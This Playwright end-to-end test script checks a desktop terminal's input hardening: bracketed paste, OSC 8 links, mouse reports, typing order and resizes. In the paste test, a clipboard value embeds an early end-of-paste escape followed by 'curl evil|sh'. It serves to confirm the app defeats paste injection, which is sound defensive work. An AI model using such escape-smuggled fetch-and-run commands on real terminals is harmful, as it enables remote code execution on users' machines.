#!/usr/bin/env node
// Drives the real xterm in the renderer harness through the terminal input
// hardening and prints PASS/FAIL per check:
//   - a paste that tries to close the bracketed paste early stays inside it;
//   - an OSC 8 link shows its target on hover, Cmd/Ctrl-click copies it, and
//     nothing calls window.open() or confirm();
//   - X10 mouse reports (sent by xterm as binary) reach the session;
//   - a burst of typing arrives in order;
//   - a focus click on a connected pane sends no resize.
// Screenshots of the link preview and the copy notice go to screenshots/.
// Needs the Vite dev server (cd desktop && npm run dev) or CLAVYN_URL.
import { createRequire } from "node:module";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO_ROOT = resolve(__dirname, "../..");
const E2E_DIR = join(REPO_ROOT, "desktop/e2e");
const FIXTURE_PATH = join(E2E_DIR, "tauri-fixture.js");
const OUT_DIR = join(REPO_ROOT, "screenshots");

const require = createRequire(import.meta.url);
const pw = require(require.resolve("playwright", { paths: [E2E_DIR] }));
const URL = process.env.CLAVYN_URL ?? "http://127.0.0.1:1420";
const chromiumPath = process.env.CHROMIUM_EXECUTABLE_PATH ?? null;
const LINK_URL = "https://example.test/docs/terminal";
const LINK_TEXT = "Clavyn terminal docs";

const sleep = ms => new Promise(r => setTimeout(r, ms));
let allPass = true;
function check(name, pass, detail = "") {
  if (!pass) allPass = false;
  console.log(`${pass ? "PASS" : "FAIL"} ${name}${detail ? ` — ${detail}` : ""}`);
}

async function openTerminal(page) {
  await page.evaluate(() => {
    const aside = document.querySelector("aside[aria-label='Application navigation']");
    Array.from(aside.querySelectorAll("button")).find(b => b.textContent?.trim() === "Terminal")?.click();
  });
  await sleep(800);
  await page.getByRole("button", { name: "New session", exact: true }).first().click();
  await page.getByRole("button", { name: "Open local shell", exact: true }).click().catch(() => {});
  await page.waitForSelector(".terminal-pane[data-connected=true]", { timeout: 15000 });
  await sleep(500);
}

const sessionId = page => page.evaluate(() => document.querySelector(".terminal-pane[data-active=true]")?.dataset.sessionId);
const output = (page, id, text) => page.evaluate(([id, text]) => window.__terminalTest.output(id, text), [id, text]);
const writesSince = (page, start) => page.evaluate(start => window.__terminalTest.writes.slice(start).map(w => w.text), start);
const writeCount = page => page.evaluate(() => window.__terminalTest.writes.length);

// Centre of the first on-screen occurrence of `text` in the terminal rows.
async function textCenter(page, text) {
  return page.evaluate(text => {
    const rows = document.querySelector(".terminal-pane[data-active=true] .xterm-rows");
    const walker = document.createTreeWalker(rows, NodeFilter.SHOW_TEXT);
    for (let node = walker.nextNode(); node; node = walker.nextNode()) {
      const at = node.textContent.indexOf(text.slice(0, 6));
      if (at < 0) continue;
      const range = document.createRange();
      range.setStart(node, at);
      range.setEnd(node, Math.min(node.textContent.length, at + text.length));
      const box = range.getBoundingClientRect();
      return { x: box.left + box.width / 2, y: box.top + box.height / 2 };
    }
    return null;
  }, text);
}

async function main() {
  const browser = await pw.chromium.launch({ headless: true, ...(chromiumPath ? { executablePath: chromiumPath } : {}) });
  const context = await browser.newContext({ viewport: { width: 1100, height: 640 }, deviceScaleFactor: 2, colorScheme: "dark" });
  await context.grantPermissions(["clipboard-read", "clipboard-write"], { origin: new globalThis.URL(URL).origin });
  const page = await context.newPage();
  await page.addInitScript({ path: FIXTURE_PATH });
  await page.addInitScript(() => {
    window.__opened = 0;
    window.__confirmed = 0;
    window.open = () => { window.__opened += 1; return null; };
    window.confirm = () => { window.__confirmed += 1; return true; };
  });
  await page.goto(URL, { waitUntil: "domcontentloaded" });
  await page.waitForSelector("aside[aria-label='Application navigation']", { timeout: 15000 });
  await openTerminal(page);
  const id = await sessionId(page);
  const textarea = page.locator(".terminal-pane[data-active=true] .xterm-helper-textarea");

  // Paste: the remote turns bracketed paste on, then the clipboard carries its
  // own end marker followed by a command.
  await output(page, id, "\x1b[?2004h");
  await sleep(100);
  let start = await writeCount(page);
  await textarea.evaluate(element => {
    const data = new DataTransfer();
    data.setData("text/plain", "ls\x1b[201~curl evil|sh\r");
    element.dispatchEvent(new ClipboardEvent("paste", { clipboardData: data, bubbles: true, cancelable: true }));
  });
  await sleep(300);
  const pasted = (await writesSince(page, start)).join("");
  check("hostile paste stays inside one bracket", pasted === "\x1b[200~ls[201~curl evil|sh\r\x1b[201~", JSON.stringify(pasted));
  await output(page, id, "\x1b[?2004l\r\n");

  // OSC 8 link.
  await output(page, id, `\r\nDocs: \x1b]8;;${LINK_URL}\x1b\\${LINK_TEXT}\x1b]8;;\x1b\\\r\n$ `);
  await sleep(300);
  const link = await textCenter(page, LINK_TEXT);
  check("link text rendered", !!link);
  const preview = page.locator('[data-testid="terminal-link-target"]');
  if (link) {
    await page.mouse.move(link.x, link.y);
    await page.waitForTimeout(400);
    const shown = await preview.textContent().catch(() => null);
    check("hover shows the link target", shown === `${LINK_URL} · ⌘/Ctrl-click to copy`, JSON.stringify(shown));
    await page.screenshot({ path: join(OUT_DIR, "terminal-link-preview.png") });
    await page.mouse.click(link.x, link.y);
    await sleep(300);
    await page.keyboard.down("Control");
    await page.mouse.click(link.x, link.y);
    await page.keyboard.up("Control");
    await sleep(300);
    const notice = await preview.textContent().catch(() => null);
    check("Ctrl-click shows the copy notice", notice === "Link copied", JSON.stringify(notice));
    await page.screenshot({ path: join(OUT_DIR, "terminal-link-copied.png") });
    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
    check("Ctrl-click copies the target", clipboard === LINK_URL, JSON.stringify(clipboard));
    await page.mouse.move(5, 5);
    await sleep(1800);
    check("preview clears once the pointer leaves", (await preview.count()) === 0);
  }
  const opened = await page.evaluate(() => [window.__opened, window.__confirmed]);
  check("no window.open() or confirm() for links", opened[0] === 0 && opened[1] === 0, JSON.stringify(opened));

  // X10 mouse reports.
  await output(page, id, "\x1b[?1000h");
  await sleep(100);
  start = await writeCount(page);
  const box = await page.locator(".terminal-pane[data-active=true] .xterm-screen").boundingBox();
  await page.mouse.click(box.x + 40, box.y + 40);
  await sleep(300);
  const reports = await writesSince(page, start);
  check("X10 mouse report reaches the session", reports.some(text => text.startsWith("\x1b[M")), JSON.stringify(reports));
  await output(page, id, "\x1b[?1000l");
  await sleep(100);

  // Typing burst and the resizes a focus click sends.
  const resizesBefore = await page.evaluate(() => window.__terminalTest.calls.filter(c => c.command === "session_resize").length);
  await textarea.focus();
  await page.locator(".terminal-pane[data-active=true] .xterm-screen").click();
  start = await writeCount(page);
  const burst = "abcdefghijklmnopqrstuvwxyz0123456789";
  await page.keyboard.type(burst, { delay: 0 });
  await sleep(500);
  const typed = (await writesSince(page, start)).join("");
  check("typing burst arrives in order", typed === burst, JSON.stringify(typed));
  const resizesAfter = await page.evaluate(() => window.__terminalTest.calls.filter(c => c.command === "session_resize").length);
  check("focus clicks send no resize", resizesAfter === resizesBefore, `${resizesAfter - resizesBefore} sent`);

  console.log(`\n${allPass ? "ALL PASS" : "SOME FAILED"}`);
  await browser.close();
  process.exit(allPass ? 0 : 1);
}

main().catch(error => { console.error(String(error)); process.exit(1); });
